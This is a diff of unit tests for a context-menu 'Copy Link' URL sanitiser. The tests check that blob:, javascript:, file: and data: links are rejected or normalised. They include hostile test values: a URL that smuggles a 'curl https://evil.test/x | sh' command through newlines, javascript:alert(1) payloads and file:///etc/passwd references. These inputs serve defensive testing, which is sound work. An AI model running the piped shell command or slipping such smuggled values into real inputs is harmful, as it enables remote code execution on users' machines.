@@ -167,7 +167,11 @@ test('Copy Link is offered only for copyable link URLs', () => {
   assert.equal(copyLink({ linkURL: '   ' }), undefined);
   assert.equal(copyLink({ linkURL: 'javascript:alert(1)' }), undefined);
   assert.equal(copyLink({ linkURL: 'data:text/html,<p>x</p>' }), undefined);
-  assert.equal(copyLink({ linkURL: 'blob:https://app.test/0f0e' }), undefined);
+  assert.equal(copyLink({ linkURL: 'blob:null/0f0e' }), undefined);
+  assert.equal(copyLink({ linkURL: 'blob:file:///etc/passwd' }), undefined);
+  assert.equal(copyLink({ linkURL: 'blob:javascript:alert(1)' }), undefined);
+  assert.equal(copyLink({ linkURL: 'blob:blob:https://app.test/0f0e' }), undefined);
+  assert.equal(copyLink({ linkURL: 'blob:mailto:someone@example.com' }), undefined);
   assert.equal(copyLink({ linkURL: 'file:///etc/passwd' }), undefined);
   assert.equal(copyLink({ linkURL: 'not a url' }), undefined);
   assert.equal(copyLink({ linkURL: 'https://app.test/' + 'a'.repeat(40000) }), undefined);
@@ -205,6 +209,32 @@ test('Copy Link writes only the normalized URL serialization', () => {
 
   // mailto: header-injection sequences stay encoded.
   assert.equal(getCopyableLinkUrl('mailto:a@example.com?body=x%0Ay'), 'mailto:a@example.com?body=x%0Ay');
+});
+
+test('Copy Link strips the blob: prefix from blob:http(s) links', () => {
+  const { getCopyableLinkUrl } = require('../lib/context-menu');
+
+  assert.equal(
+    getCopyableLinkUrl('blob:https://copilot.cloud.microsoft/0f0e1d2c-3b4a-5968-7766-554433221100'),
+    'https://copilot.cloud.microsoft/0f0e1d2c-3b4a-5968-7766-554433221100'
+  );
+  assert.equal(getCopyableLinkUrl('blob:http://app.test/x'), 'http://app.test/x');
+  assert.equal(getCopyableLinkUrl('BLOB:HTTPS://APP.TEST/x'), 'https://app.test/x');
+  assert.equal(getCopyableLinkUrl('blob:https://app.test/x#frag'), 'https://app.test/x#frag');
+
+  // The unwrapped URL receives the same normalization as a direct link.
+  const injected = getCopyableLinkUrl('blob:https://app.test/a\ncurl https://evil.test/x | sh\n');
+  assert.ok(injected.startsWith('https://app.test/'));
+  assert.doesNotMatch(injected, /[\r\n\t ]/);
+  assert.equal(getCopyableLinkUrl('blob:https://\u0430pple.com/x'), 'https://xn--pple-43d.com/x');
+
+  // Only one http(s) layer is unwrapped.
+  for (const value of [
+    'blob:', 'blob:null/0f0e', 'blob:file:///etc/passwd', 'blob:javascript:alert(1)',
+    'blob:data:,x', 'blob:blob:https://app.test/x', 'blob:mailto:a@example.com',
+  ]) {
+    assert.equal(getCopyableLinkUrl(value), '', value);
+  }
 });
 
 function openHandlerFor(create) {
